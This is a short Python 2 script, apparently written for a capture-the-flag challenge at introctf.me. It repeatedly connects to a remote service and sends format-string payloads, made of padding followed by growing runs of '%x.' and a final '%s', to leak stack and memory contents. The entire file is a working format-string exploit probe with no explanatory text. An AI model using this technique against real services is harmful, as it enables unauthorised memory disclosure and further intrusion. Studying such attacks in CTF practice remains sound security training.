import socket
import time

for i in range(32):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('introctf.me', 11111))
    print s.recv(1024)
    hackString = 'A' * 64 + '%x.' * i + '%s\n'
    s.sendall(hackString)
    time.sleep(0.5)
    print s.recv(1024)
    s.close()
    
